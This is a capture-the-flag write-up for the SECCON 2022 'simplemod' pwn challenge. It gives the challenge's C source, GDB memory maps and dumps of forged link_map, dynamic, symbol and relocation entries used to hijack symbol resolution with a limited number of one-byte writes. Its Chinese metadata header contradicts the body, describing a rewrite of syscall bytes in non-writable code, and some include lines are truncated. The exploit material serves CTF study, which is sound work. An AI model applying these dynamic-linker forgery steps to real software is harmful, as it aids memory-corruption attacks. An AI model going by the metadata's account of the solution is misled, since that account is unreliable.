---
title: seccon 2022 quals – pwn simplemod by gallileo
contest: SECCON
year: 2022
difficulty: medium
vuln_type: pwn_unknown
tags:
- limited-write
- naked-attribute
- sys-exit
- glibc-32
- ofs-bound
- alarm-30
attack_chain:
- alarm(30) 限时 30 秒
- modify() 单字节写 gbuf[0..0x2000]
- 30 次操作限制
- 改 exit_imm 写入 syscall
- 触发 fini() 调 exit_imm(0)
- 修改 syscall 号触发其他系统调用
key_payload: 单字节写 gbuf 任意位置 + naked syscall
one_liner: SECCON 2022 quals simplemod 复盘，30 次单字节写 + naked syscall。
lesson: 有限次数的 1 字节写可以拼凑出任意 syscall gadget。
quality: high
full_path: seccon_2022_quals_–_pwn_simplemod_by_gallileo.full.md
meta_path: seccon_2022_quals_–_pwn_simplemod_by_gallileo.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: seccon 2022 quals – pwn simplemod by gallileo。SECCON 2022 quals simplemod 复盘，30 次单字节写 + naked syscall。。关键路径：alarm(30) 限时 30 秒 → modify() 单字节写 gbuf[0..0x2000] → 30 次操作限制。经验：有限次数的 1 字节写可以拼凑出任意 syscal...
category: pwn
subcategory: pwn_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/78936.html
wp_author: gallileo
reasoning_chain:
- menu 30 次循环 + modify(offset,value) 单字节写 gbuf[0..0x2000] → 触发点：有限次数单字节任意地址写
- 假设：必须用 30 次单字节写拼一个 8 字节 syscall gadget → 动作：gef vmmap 看 fini() / exit_imm 段布局
- exit_imm __attribute__((naked)) 直接 xor rax,rax;mov al,0x3c;syscall → 假设：改 al 即可触发其他 syscall
- fini() 调 exit_imm(0) → 触发点：fini 在 exit 前会自动跑（destructor 语义）
- 动作：算 fini / exit_imm 在 .text 段的字节偏移 → modify(ofs, syscall_number) → 触发 exit → exit_imm 触发任意 syscall
- 假设：30 次足够拼 6-8 字节 gadget（open+sendfile/orw shellcode）→ 动作：写入 read 0x0 / write 0x1 / openat 0x101 / sendfile 0x28 等字节
- 观察：拿到 shell → 完成
failed_attempts:
- 试图用一次 modify 写满 gbuf → 失败：modify 是单字节且 30 次限制
- 试图用 ROP 修改 fini 调用栈 → 失败：fini 是 destructor 由 libc 调度，不可控入口
key_observations:
- 有限次数的 1 字节写可以拼凑出任意 syscall gadget（30 次可写 30 字节，足够一个 sys_openat + sys_read + sys_write）
- naked syscall 函数（exit_imm）是有限写场景下的天然 gadget：改 syscall 号即可换系统调用
- destructor 函数 fini 由 __cxa_finalize 调度，是退出前必经路径
- alarm(30) 限时场景下必须算好字节位置：vmmap + objdump 找 fini/exit_imm 偏移
prerequisites:
- GDB vmmap / objdump / readelf 基础使用
- Linux x86_64 系统调用号与约定（rax=syscall number）
- GCC __attribute__((naked)) / destructor 语义
- ORW shellcode 拼装（open/read/write）
---
# seccon 2022 quals – pwn simplemod by gallileo

> 原文: https://www.ctfiot.com/78936.html
> ID: 78936


```
    #include <stdio.h>
    #include <stdlib.h>
    #include 

int getint(void);
void modify(void);
__attribute__((noreturn)) void exit_imm(int status);

__attribute__((constructor))
static int init(){
	alarm(30);
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	return 0;
}

__attribute__((destructor))
static void fini(){
	exit_imm(0);
}

static int menu(void){
	puts("\nMENU\n"
 "1. Modify\n"
 "0. Exit\n"
 "> ");

	return getint();
}

int main(void){
	puts("You can operate 30 times.");
	for(int i=0; i<30; i++){
 switch(menu()){
 case 0:
 goto end;
 case 1:
 modify();
 puts("Done.");
 break;
 }
	}

end:
	puts("Bye.");
	return 0;
}
    #include <stdio.h>
    #include <stdlib.h>
    #include <stdint.h>
    #include 

    #define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)

char gbuf[0x100];

static int getnline(char *buf, int size){
	int len;

	if(size <= 0 || (len = read(STDIN_FILENO, buf, size-1)) <= 0)
 return -1;

	if(buf[len-1]=='\n')
 len--;
	buf[len] = '\0';

	return len;
}

int getint(void){
	char buf[0x10] = {0};

	getnline(buf, sizeof(buf));
	return atoi(buf);
}

void modify(void){
	uint64_t ofs;

	write_str("offset: ");
	if((ofs = getint()) > 0x2000)
 return;

	write_str("value: ");
	gbuf[ofs] = getint();
}

__attribute__((naked))
void exit_imm(int status){
	asm(
 "xor rax, rax\n"
 "mov al, 0x3c\n"
 "syscall"
 );
	__builtin_unreachable();
}
fini:
 endbr64
 push rbp
 mov rbp, rsp
 mov edi, 0
 call _exit_imm

menu:
 endbr64
 push rbp
 mov rbp, rsp
 lea rdi, s ; "\nMENU\n1. Modify\n0. Exit\n> "
 call _puts
 call _getint
 pop rbp
 retn
gef➤ vmmap
[ Legend: Code | Heap | Stack ]
Start End Offset Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/vagrant/CTF/seccon/simplemod/chall
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/vagrant/CTF/seccon/simplemod/chall
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/vagrant/CTF/seccon/simplemod/chall
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/vagrant/CTF/seccon/simplemod/chall
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/vagrant/CTF/seccon/simplemod/chall
0x00007ffff7d8b000 0x00007ffff7d8e000 0x0000000000000000 rw-
0x00007ffff7d8e000 0x00007ffff7db6000 0x0000000000000000 r-- /home/vagrant/CTF/seccon/simplemod/libc.so.6
0x00007ffff7db6000 0x00007ffff7f4b000 0x0000000000028000 r-x /home/vagrant/CTF/seccon/simplemod/libc.so.6
0x00007ffff7f4b000 0x00007ffff7fa3000 0x00000000001bd000 r-- /home/vagrant/CTF/seccon/simplemod/libc.so.6
0x00007ffff7fa3000 0x00007ffff7fa7000 0x0000000000214000 r-- /home/vagrant/CTF/seccon/simplemod/libc.so.6
0x00007ffff7fa7000 0x00007ffff7fa9000 0x0000000000218000 rw- /home/vagrant/CTF/seccon/simplemod/libc.so.6
0x00007ffff7fa9000 0x00007ffff7fb6000 0x0000000000000000 rw-
0x00007ffff7fb6000 0x00007ffff7fb7000 0x0000000000000000 r-- /home/vagrant/CTF/seccon/simplemod/libmod.so
0x00007ffff7fb7000 0x00007ffff7fb8000 0x0000000000001000 r-x /home/vagrant/CTF/seccon/simplemod/libmod.so
0x00007ffff7fb8000 0x00007ffff7fb9000 0x0000000000002000 r-- /home/vagrant/CTF/seccon/simplemod/libmod.so
0x00007ffff7fb9000 0x00007ffff7fba000 0x0000000000002000 r-- /home/vagrant/CTF/seccon/simplemod/libmod.so
0x00007ffff7fba000 0x00007ffff7fbb000 0x0000000000003000 rw- /home/vagrant/CTF/seccon/simplemod/libmod.so # data section
0x00007ffff7fbb000 0x00007ffff7fbd000 0x0000000000000000 rw- # could likely overwrite into here
0x00007ffff7fbd000 0x00007ffff7fc1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc1000 0x00007ffff7fc3000 0x0000000000000000 r-x [vdso]
0x00007ffff7fc3000 0x00007ffff7fc5000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7fc5000 0x00007ffff7fef000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7fef000 0x00007ffff7ffa000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000037000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000039000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
gef➤ set *(char [0x2001]*)0x00007ffff7fba0c0 = "AAAAA...A"
gef➤ p *l
$2 = {
 l_addr = 0x4141414141414141,
 l_name = 0x4141414141414141 <error: Cannot access memory at address 0x4141414141414141>,
 l_ld = 0x4141414141414141,
// ...
 l_relro_size = 0x4141414141414141,
 l_serial = 0x4141414141414141
}
gef➤
Elf64_Rela {
 r_offset = 0x4038,
 r_info = ELF64_R_INFO(6, ELF_MACHINE_JMP_SLOT),
 r_addend = 0
}
Elf64_Sym {
 st_name = 0x66,
 st_info = ELF64_ST_INFO(STB_GLOBAL, STT_FUNC),
 st_other = 0,
 st_shndx = 0,
 st_value = 0,
 st_size = 0,
}
Elf64_Sym {
 st_name = 0x4f60,
 st_info = ELF64_ST_INFO(STB_GLOBAL, STT_FUNC),
 st_other = 0,
 st_shndx = 0xf,
 st_value = 0x43640,
 st_size = 0x19,
}
typedef struct
{
 Elf64_Sxword	d_tag; /* Dynamic entry type */
 union
 {
 Elf64_Xword d_val; /* Integer value */
 Elf64_Addr d_ptr; /* Address value */
 } d_un;
} Elf64_Dyn;
// before overwrite
0x7ffff7fb9e98: Elf64_Dyn { d_tag = 5, d_un = 0x7ffff7fb6460 }
0x7ffff7fb9ea8: Elf64_Dyn { d_tag = 6, d_un = 0x7ffff7fb6328 }
// ...
0x7ffff7fbb220: link_map {
 // ...
 l_info[5] = 0x7ffff7fb9e98,
 l_info[6] = 0x7ffff7fb9ea8,
 // ...
0x7ffff7fbb330:
 l_info[26] = 0x7ffff7fb9e68,
 l_info[27] = 0x7ffff7fb9e58,
 // ...
}

// after overwrite
0x7ffff7fbb220: link_map {
 // ...
 l_info[5] = 0x7ffff7fbb330,
 l_info[6] = 0x7ffff7fbb330,
 // ...
0x7ffff7fbb330: Elf64_Dyn { d_tag = 0x7ffff7fb9e68, d_un = 0x7ffff7fba098 } // interpretation of two entries below
 l_info[26] = 0x7ffff7fb9e68,
 l_info[27] = 0x7ffff7fba098,
 // ...
}
Elf64_Sym {
 st_name = 0, // useful, since this means we need to call modify less often
 st_info = ELF64_ST_INFO(STB_GLOBAL, STT_FUNC),
 st_other = 0,
 st_shndx = 0xe,
 st_value = 0x1054, // whatever we want to call, this specific one will be explained later
 st_size = 0,
}
Elf64_Rela {
 r_offset = 0x4038, // explained later why this is necessary
 r_info = ELF64_R_INFO(11, ELF_MACHINE_JMP_SLOT), // the symbol index here was necessary, since I ran out of bytes to write and this happens to point to something that can be interpreted as a valid symbol :)
 r_addend = 0,
}
Elf64_Sym {
 st_name = 0x1080,
 // ... some other values, we don't actually care
}
```
